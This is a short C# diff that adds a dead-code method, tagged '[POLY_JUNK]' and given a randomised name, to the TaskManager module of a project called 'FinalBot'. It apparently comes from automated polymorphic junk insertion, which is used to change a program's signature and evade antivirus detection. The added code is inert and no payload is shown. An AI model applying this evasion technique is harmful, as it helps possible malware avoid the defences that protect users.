@@ -7,6 +7,12 @@ namespace FinalBot.Modules
 {
     public static class TaskManager
     {
+        // [POLY_JUNK]
+        private static void _vanguard_ecbeb2ea() {
+            int val = 41785;
+            if (val > 50000) Console.WriteLine("Hash:" + 41785);
+        }
+
         public static string GetProcessList()
         {
             try
